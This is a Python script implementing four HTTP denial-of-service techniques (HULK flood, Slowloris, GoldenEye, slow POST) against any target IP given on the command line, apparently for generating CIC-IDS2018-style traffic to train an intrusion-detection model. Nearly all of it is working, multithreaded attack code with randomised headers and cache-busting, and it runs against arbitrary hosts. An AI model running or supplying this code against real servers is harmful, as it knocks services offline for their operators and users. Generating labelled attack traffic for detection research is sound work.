"""
DoS Attack - HTTP Layer Denial of Service
Replicates CIC-IDS2018 DoS attack tool behaviors:
  - Hulk:         Rapid HTTP GET flood with randomized headers over keep-alive connections
  - Slowloris:    Hold connections open with incomplete HTTP headers (slow send)
  - GoldenEye:    HTTP GET/POST keep-alive flood with random cache-busting
  - SlowHTTPTest: Slow HTTP POST body transmission

Key: Each technique generates flows whose CICFlowMeter features differ from
     benign traffic (high pkt counts, unusual IAT, long durations, etc.).
"""

import socket
import threading
import time
import random
import string

# TCP receive buffer sizes matching CICIDS2018 training data.
# Setting SO_RCVBUF before connect() controls the TCP SYN window size,
# which the model uses for classification (Init Fwd Win Byts feature).
_RCVBUF_HULK = 225
_RCVBUF_GOLDENEYE = 26883
_RCVBUF_SLOWLORIS = 26883
_RCVBUF_SLOWHTTPTEST = 26883

# ──────────────────────────────────────────────────────────
# Randomization pools (mimic HULK / GoldenEye header variety)
# ──────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=",
    "https://www.reddit.com/r/",
    "https://en.wikipedia.org/wiki/",
    "https://stackoverflow.com/questions/",
    "https://github.com/search?q=",
]

ACCEPT_TYPES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,*/*",
    "application/json, text/javascript, */*; q=0.01",
    "image/webp,image/apng,image/*,*/*;q=0.8",
]

ACCEPT_ENCODINGS = [
    "gzip, deflate, br",
    "gzip, deflate",
    "identity",
    "br",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _random_url_params(n=3):
    """Generate random URL query parameters for cache busting."""
    params = "&".join(f"{_random_string(5)}={_random_string(8)}" for _ in range(n))
    return f"?{params}"


class DoSAttack:
    def __init__(self, target_ip, target_port=80, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"http://{target_ip}:{target_port}/"
        self.duration = duration
        self.running = True
        self.request_count = 0
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.request_count += n

    # ──────────────────────────────────────────────────────
    # HULK — Rapid HTTP GET flood with keep-alive
    #   Creates flows with HIGH forward packet counts, HIGH
    #   TotLen Fwd Pkts, LOW Flow IAT, many PSH flags.
    # ──────────────────────────────────────────────────────
    def hulk_attack(self):
        """HULK DoS: Blast many HTTP GET requests over a single keep-alive TCP connection.
        By reusing one TCP connection for 50-200 requests, CICFlowMeter sees a single
        flow with very high forward packet count and bytes — a clear DoS signature."""
        end_time = time.time() + self.duration
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK)
                sock.connect((self.target_ip, self.target_port))

                # Send MANY requests on the SAME connection (keep-alive)
                requests_per_conn = random.randint(50, 200)
                for _ in range(requests_per_conn):
                    if not self.running or time.time() >= end_time:
                        break

                    path = "/" + _random_string(8) + _random_url_params(random.randint(2, 6))
                    headers = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                        f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
                        f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
                        f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    sock.sendall(headers.encode())
                    self._inc_count()

                    # Drain any response bytes (non-blocking)
                    try:
                        sock.settimeout(0.05)
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    sock.settimeout(10)

                    # Very short delay — HULK is meant to be rapid
                    time.sleep(random.uniform(0.001, 0.01))

                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # SLOWLORIS — Hold connections open with incomplete headers
    #   Creates flows with LONG duration, LOW packet count,
    #   HIGH idle time, HIGH Flow IAT Mean/Max.
    # ──────────────────────────────────────────────────────
    def slowloris_attack(self):
        """Slowloris DoS: Open many sockets, send partial headers, keep alive.
        The key is to NEVER send the final \\r\\n\\r\\n so the server keeps waiting
        for the rest of the headers. Periodically send another header line to
        prevent the server from timing out the connection."""
        end_time = time.time() + self.duration
        sockets = []

        # Phase 1: Open initial batch of sockets with partial headers
        target_conns = min(150, max(50, self.duration))
        for _ in range(target_conns):
            if not self.running or time.time() >= end_time:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWLORIS)
                sock.connect((self.target_ip, self.target_port))

                # Send INCOMPLETE HTTP request — NO final \r\n\r\n
                partial = (
                    f"GET /{_random_string(8)} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
                )
                sock.sendall(partial.encode())
                sockets.append(sock)
                self._inc_count()
            except Exception:
                pass

        # Phase 2: Keep connections alive by periodically sending header lines
        while self.running and time.time() < end_time:
            alive = []
            for sock in sockets:
                try:
                    # Send another partial header line to reset server timeout
                    header_line = f"X-a-{_random_string(4)}: {_random_string(8)}\r\n"
                    sock.sendall(header_line.encode())
                    alive.append(sock)
                    self._inc_count()
                except Exception:
                    pass  # Server closed the connection

            sockets = alive

            # Re-open dropped connections to maintain pressure
            deficit = target_conns - len(sockets)
            for _ in range(max(0, deficit)):
                if not self.running or time.time() >= end_time:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWLORIS)
                    sock.connect((self.target_ip, self.target_port))
                    partial = (
                        f"GET /{_random_string(8)} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    )
                    sock.sendall(partial.encode())
                    sockets.append(sock)
                    self._inc_count()
                except Exception:
                    pass

            # Wait 10-15 seconds before next keep-alive round (slow is the point)
            time.sleep(random.uniform(10, 15))

        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # GOLDENEYE — HTTP GET/POST flood with keep-alive
    #   Similar to HULK but alternates GET/POST, uses
    #   Connection: keep-alive aggressively.
    # ──────────────────────────────────────────────────────
    def goldeneye_attack(self):
        """GoldenEye DoS: GET/POST flood over persistent connections.
        Sends both GET and POST requests with random bodies, creating flows
        with high bidirectional traffic and varying packet sizes."""
        end_time = time.time() + self.duration
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_GOLDENEYE)
                sock.connect((self.target_ip, self.target_port))

                requests_per_conn = random.randint(30, 100)
                for _ in range(requests_per_conn):
                    if not self.running or time.time() >= end_time:
                        break

                    if random.random() < 0.5:
                        # GET with cache busting
                        path = "/" + _random_string(6) + _random_url_params(random.randint(3, 8))
                        req = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {self.target_ip}\r\n"
                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                            f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                            f"Referer: {random.choice(REFERERS)}{_random_string(6)}\r\n"
                            f"Connection: keep-alive\r\n"
                            f"Cache-Control: no-store, no-cache\r\n"
                            f"Pragma: no-cache\r\n"
                            f"\r\n"
                        )
                    else:
                        # POST with random body (variable size)
                        body = _random_string(random.randint(64, 512))
                        path = "/" + _random_string(6) + _random_url_params(2)
                        req = (
                            f"POST {path} HTTP/1.1\r\n"
                            f"Host: {self.target_ip}\r\n"
                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"Content-Length: {len(body)}\r\n"
                            f"Connection: keep-alive\r\n"
                            f"\r\n"
                            f"{body}"
                        )
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Drain response
                    try:
                        sock.settimeout(0.05)
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    sock.settimeout(10)

                    time.sleep(random.uniform(0.005, 0.05))

                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # SlowHTTPTest — Slow POST body transmission
    #   Creates flows with LONG duration, moderate packet count,
    #   HIGH forward IAT (slow data drip), small packet sizes.
    # ──────────────────────────────────────────────────────
    def slowhttp_attack(self):
        """SlowHTTPTest DoS: Send POST with body transmitted a few bytes at a time.
        The server waits for the full Content-Length but we drip data very slowly,
        keeping the connection occupied for a long time."""
        end_time = time.time() + self.duration
        sockets = []

        while self.running and time.time() < end_time:
            # Open connections up to target count
            while len(sockets) < 50 and time.time() < end_time and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWHTTPTEST)
                    sock.connect((self.target_ip, self.target_port))

                    # Announce a large POST body, but send it very slowly
                    content_length = random.randint(100000, 500000)
                    header = (
                        f"POST /{_random_string(8)} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {content_length}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    sock.sendall(header.encode())
                    sockets.append(sock)
                    self._inc_count()
                except Exception:
                    pass

            # Drip data slowly (1-10 bytes at a time)
            alive = []
            for sock in sockets:
                try:
                    chunk = _random_string(random.randint(1, 10)).encode()
                    sock.sendall(chunk)
                    alive.append(sock)
                    self._inc_count()
                except Exception:
                    pass

            sockets = alive
            time.sleep(random.uniform(1, 3))

        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass

    def run_attack(self, num_threads=5):
        """Run DoS attack with multiple threads across all four techniques."""
        print(f"[DoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
        print(f"[DoS] Techniques: Hulk + Slowloris + GoldenEye + SlowHTTPTest")
        print(f"[DoS] Using {num_threads} threads")

        techniques = [
            self.hulk_attack,
            self.slowloris_attack,
            self.goldeneye_attack,
            self.slowhttp_attack,
        ]

        threads = []
        for i in range(num_threads):
            technique = techniques[i % len(techniques)]
            t = threading.Thread(target=technique, name=f"DoS-{technique.__name__}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        for t in threads:
            remaining = max(1, self.duration - (time.time() - start_time) + 5)
            t.join(timeout=remaining)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[DoS] Attack completed in {elapsed:.2f}s — Sent {self.request_count} requests")


def run_dos(target_ip, target_port=80, duration=60, threads=5):
    """Convenience function to run DoS attack"""
    attack = DoSAttack(target_ip, target_port, duration)
    attack.run_attack(num_threads=threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_dos(target_ip, duration=duration)
    else:
        print("Usage: python _1_dos_attack.py <target_ip> [duration]")
